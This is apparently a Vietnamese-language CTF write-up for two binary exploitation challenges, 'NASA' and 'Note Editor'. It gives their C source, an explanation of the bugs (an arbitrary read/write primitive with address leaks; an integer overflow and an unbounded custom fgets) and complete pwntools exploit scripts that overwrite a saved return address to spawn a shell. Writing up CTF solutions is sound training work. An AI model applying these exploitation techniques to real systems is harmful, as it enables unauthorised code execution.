NASA


Spawn challenge instance :

 ncat --ssl nasa.gpn23.ctf.kitctf.de 443
source code Nasa.c :

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

void win() {
	puts("YOU WIN!!!\n");
	system("/bin/sh");
	exit(0);
}

void provide_help(void *stack_ptr) {
	printf("%p\n", stack_ptr);
	printf("%p\n", &win);
}

int main(void) {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

//Write What(value) Where(address)
	long long option;
	provide_help(&option);
	while (1) {
		puts("[1] Write [2] Read [3] Exit");
		if (scanf("%llu", &option) != 1)
			break;
		if (option == 1) {
			puts("8-byte adress and 8-byte data to write please (hex)");
			uintptr_t addr;
			uint64_t val;
			scanf("%lx %lx", &addr, &val);
			*((uint64_t *)addr) = val;
		} else if (option == 2) {
			puts("8-byte adress to read please (hex)");
			uintptr_t addr;
			scanf("%lx", &addr);
			printf("%lx\n", *((uint64_t *)addr));
		} else if (option == 3) {
			puts(":wave:");
			break;
		} else {
			puts("Invalid option");
		}
	}
	return 0;
}
Với source code này, về logic đây là 1 bài Write What Where. Hàm provide_help giúp leak ra địa chỉ stack address, nên về exploit idea là chúng ta leak stack address và sau đó viết address của hàm win to the stack address và sau đấy call hàm win.

Nhưng bài này lại khacs hơn so với các bài khác là bài này cần phải build docker để có thể lấy libc từ trong docker patch vào file thì mới chạy được, chứ nếu chạy bình thường sẽ không chạy được.

Sau khi build docker và lấy libc.so.6 từ trong dockerfile ra, ta sẽ tiến hành viết exploit cho bài này

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys
from subprocess import check_output
from time import sleep

context.binary = ELF('./nasa_patched', checksec=False)
exe = context.binary
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]

gdbscript = '''
init-pwndbg
# b* 0x1533
# b* 0x1655
b* 0x1705
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "./nasa"]))
        gdb.attach(int(pid), gdbscript=gdbscript + f"\nset sysroot /proc/{pid}/root\nfile /proc/{pid}/exe")
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def slog(name, addr):  # log nicely
    log.success(f'{name}: {hex(addr)}')

# =============== EXPLOIT =====================
p = start()

def rl():
    return p.recvline().strip()

def sla(delim, data):
    p.sendlineafter(delim, data)


leak = int(rl(), 16)
pie_base = int(rl(), 16) - exe.sym.win
exe.address = pie_base

slog('leak', leak)
slog('PIE base', exe.address)


sla(b't\n', b'2')
sla(b')\n', f'{hex(exe.got["exit"])}'.encode())
libc_leak = int(rl(), 16)
libc.address = libc_leak - libc.sym.exit
slog('libc base', libc.address)


sla(b't\n', b'2')
sla(b')\n', f'{hex(libc.sym.environ)}'.encode())
stack_leak = int(rl(), 16)
saved_rip = stack_leak - 0x130
slog('stack leak', stack_leak)
slog('saved RIP', saved_rip)


sla(b't\n', b'1')
sla(b')\n', f'{hex(saved_rip)} {hex(exe.sym.win + 22)}'.encode())


sla(b't\n', b'3')


p.interactive()
Note Editor


Spawn challenge instance :

ncat --ssl note-editor.gpn23.ctf.kitctf.de 443
Source code :

Main.c :

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>


#define NOTE_SIZE 1024
struct Note {
    char* buffer;
    size_t size;
    uint32_t budget; 
    uint32_t pos; 
};
typedef struct Note Note;

#define SCANLINE(format, args) \
    ({ \
    char* __scanline_line = NULL; \
    size_t __scanline_length = 0; \
    getline(&__scanline_line, &__scanline_length, stdin); \
    sscanf(__scanline_line, format, args); \
    })

void setup() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void reset(Note* note) {
    memset(note->buffer, 0, note->size);
    note->budget = note->size;
    note->pos = 0;
}

void append(Note* note) {
    printf("Append something to your note (%u bytes left):\n", note->budget);
    fgets(note->buffer + note->pos, note->budget, stdin);
    uint32_t written = strcspn(note->buffer + note->pos, "\n") + 1;
    note->budget -= written;
    note->pos += written;
}

void edit(Note* note) {
    printf("Give me an offset where you want to start editing: ");
    uint32_t offset;
    SCANLINE("%u", &offset);
    printf("How many bytes do you want to overwrite: ");
    int64_t length;
    SCANLINE("%ld", &length);
    if (offset <= note->pos) {
        uint32_t lookback = (note->pos - offset);
        if (length <= note->budget + lookback) {
            fgets(note->buffer + offset, length + 2, stdin); // plus newline and null byte
            uint32_t written = strcspn(note->buffer + offset, "\n") + 1;
            if (written > lookback) {
                note->budget -= written - lookback;
                note->pos += written - lookback;
            }
        }
    } else {
        printf("Maybe write something there first.\n");
    }
}

void truncate(Note* note) {
    printf("By how many bytes do you want to truncate?\n");
    uint32_t length;
    SCANLINE("%u", &length);
    if (length > note->pos) {
        printf("You did not write that much, yet.\n");
    } else {
        note->pos -= length;
        memset(note->buffer + note->pos, 0, length);
        note->budget += length;
    }
}

uint32_t menu() {
    uint32_t choice;
    printf(
        "Choose your action:\n"
        "1. Reset note\n"
        "2. View current note\n"
        "3. Append line to note\n"
        "4. Edit line at offset\n"
        "5. Truncate note\n"
        "6. Quit\n"
    );
    SCANLINE("%u", &choice);
    return choice;
}

int main() {
    Note note;
    char buffer[NOTE_SIZE];
    
    note = (Note) {
        .buffer = buffer,
        .size = sizeof(buffer),
        .pos = 0,
        .budget = sizeof(buffer)
    };

    setup();
    reset(&note);
    printf("Welcome to the terminal note editor as a service.\n");
    
    while (1)
    {
        uint32_t choice = menu();
        switch (choice)
        {
        case 1:
            reset(&note);
            break;
        case 2:
            printf("Current note content:\n\"\"\"\n");
            puts(note.buffer);
            printf("\"\"\"\n");
            break;
        case 3:
            append(&note);
            break;
        case 4:
            edit(&note);
            break;
        case 5:
            truncate(&note);
            break;
        case 6: // fall trough to exit
            printf("Bye\n");
            return 0;
        default:
            printf("Exiting due to error or invalid action.\n");
            exit(1);
        }
    }
}
lib.c :

#include <stdio.h>
#include <unistd.h>


char *fgets(char* s, int size, FILE *restrict stream) {
    char* cursor = s;
    for (int i = 0; i < size -1; i++) {
        int c = getc(stream);
        if (c == EOF) break;
        *(cursor++) = c;
        if (c == '\n') break;
    }
    // *cursor = '\0'; // our note is always null terminated
    return s;
}

void win() {
    execve("/bin/sh", NULL, NULL);
}
Ở đây có 2 souce code C, nên ta sẽ phân tích từng cái 1 để hiểu code hoạt động như thế nào :

Nhìn chung, đoạn code cho phép chúng ta create note, append lines vào trong note, edit line at offset và truncate note. Về cơ bản í tưởng là note này được ghi chú ở trong 1 buffer với kích thước cố định, nên sau khi đọc code ta thấy được có int overflow tiềm ẩn ở trong hàm void edit :

void edit(Note* note) {
    printf("Give me an offset where you want to start editing: ");
    uint32_t offset;
    SCANLINE("%u", &offset);
    printf("How many bytes do you want to overwrite: ");
    int64_t length;
    SCANLINE("%ld", &length);
    if (offset <= note->pos) {
        uint32_t lookback = (note->pos - offset);
        if (length <= note->budget + lookback) {
            fgets(note->buffer + offset, length + 2, stdin); // plus newline and null byte
            uint32_t written = strcspn(note->buffer + offset, "\n") + 1;
            if (written > lookback) {
                note->budget -= written - lookback;
                note->pos += written - lookback;
            }
        }
    } else {
        printf("Maybe write something there first.\n");
    }
}
Ta có thể thấy từ đoạn code này dòng fgets(note->buffer + offset, length + 2, stdin) với length <= note -> budget + lookback, nếu như length là 1 giá trị rất lớn kiểu int_64max thì có thể ghi tràn qua cả giá trị âm, gây ra phá vỡ logic, vậy nên xuất hiện int overflow ở đây.

Ngoài ra khi xem trong hàm lib, với *cursor = '\0', cursor này có thể chạy khắp bộ nhớ gây ra buffer overflow khắp bọ nhớ vì nếu không kiểm tra size thì sau mỗi vòng lặp cursor sẽ continue running, gây ra buffer overflow cục bộ trên toàn chương trình.

Vậy nên í tưởng khai thác exploit sẽ là leak stack address, dùng int overflow để trigger buffer overflow và ghi đè lên return address để gọi được win function ra ngoài.

Ta sẽ bắt đầu thực hiện viết exploit :

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
b *0x401716
b *0x401708
b *0x4016CA
b *0x4016E2
b *0x4016FA
b *0x401458
b *0x401498
b *0x401748
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript + f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def debug(p):
    gdb.attach(p, gdbscript=gdbscript)
    pause()


def fixleak(data):
    return u64(data.ljust(8, b'\x00'))

# ==================== EXPLOIT ====================
p = start()


p.sendlineafter(b't\n', b'3')
p.sendlineafter(b':\n', b'A' * 1022)

p.sendlineafter(b't\n', b'4')
p.sendlineafter(b': ', b'1016')
p.sendlineafter(b': ', b'8')
p.sendline(b'B' * 7)


p.sendlineafter(b't\n', b'2')
p.recvuntil(b'B' * 7 + b'\n')
stack_leak = fixleak(p.recvline()[:-1])
log.success(f'stack leak @ {hex(stack_leak)}')

 
debug(p)


p.sendlineafter(b't\n', b'4')
p.sendlineafter(b': ', b'1016')
p.sendlineafter(b': ', b'-2147483650')
payload = b'C' * 8
payload += p64(stack_leak)
payload += p64(0x400) * 2
payload += p64(0xdeadbeef) * 2
payload += p64(exe.sym.win)
p.sendline(payload)


p.sendlineafter(b't\n', b'6')
p.interactive()
